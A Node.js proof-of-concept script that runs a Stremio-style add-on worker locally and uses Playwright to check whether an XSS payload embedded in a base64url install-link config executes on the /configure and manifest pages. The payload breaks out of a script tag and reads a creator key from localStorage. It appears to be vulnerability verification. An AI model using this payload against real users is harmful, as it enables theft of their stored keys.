import http from "node:http";
import { chromium } from "playwright";
import { makeEnv, makeKv, makeD1, worker } from "../../tests/harness.mjs";

const env = makeEnv({ CONFIGS: makeKv(), DB: makeD1() });
const ctx = { waitUntil: (p) => { Promise.resolve(p).catch(() => {}); } };
const server = http.createServer(async (req, res) => {
  const url = "http://127.0.0.1:" + server.address().port + req.url;
  const chunks = []; for await (const c of req) chunks.push(c);
  const init = { method: req.method, headers: req.headers };
  if (chunks.length) init.body = Buffer.concat(chunks);
  let out; try { out = await worker.fetch(new Request(url, init), env, ctx); }
  catch (e) { res.writeHead(500); res.end(String(e)); return; }
  const body = Buffer.from(await out.arrayBuffer());
  const h = {}; out.headers.forEach((v, k) => { h[k] = v; });
  res.writeHead(out.status, h); res.end(body);
});
await new Promise((r) => server.listen(0, "127.0.0.1", r));
const base = "http://127.0.0.1:" + server.address().port;

// An "install link" whose embedded config carries the payload in traktKey.
const cfg = Buffer.from(JSON.stringify({
  entries: [{ name: "Popular", url: "tmdb:chart:popular", type: "movie", enabled: true }],
  traktAccessToken: "</script><script>window.__XSS2=1;document.title='PWNED2:'+localStorage.getItem('myListAddon:creatorKey')</script>",
}), "utf8").toString("base64").replace(/\+/g,"-").replace(/\//g,"_").replace(/=+$/,"");

const browser = await chromium.launch({ executablePath: "/opt/pw-browsers/chromium-1194/chrome-linux/chrome", args: ["--no-sandbox"] });
const page = await browser.newPage();
await page.goto(base + "/robots.txt");
await page.evaluate(() => localStorage.setItem("myListAddon:creatorKey", "MYL-VICT-IMSK-EY01"));

// 1) direct /configure link
await page.goto(`${base}/${cfg}/configure`, { waitUntil: "domcontentloaded" });
console.log("A. /<config>/configure  ran:", await page.evaluate(() => window.__XSS2 === 1), "| title:", await page.title());

// 2) the shape people actually paste around: an install/manifest link, opened in a browser
await page.goto(base + "/robots.txt");
await page.evaluate(() => { delete window.__XSS2; });
await page.goto(`${base}/${cfg}/manifest.json`, { waitUntil: "domcontentloaded" });
console.log("B. /<config>/manifest.json (browser nav -> 302 to configure)");
console.log("   final url:", page.url());
console.log("   ran:", await page.evaluate(() => window.__XSS2 === 1), "| title:", await page.title());

await browser.close(); server.close();
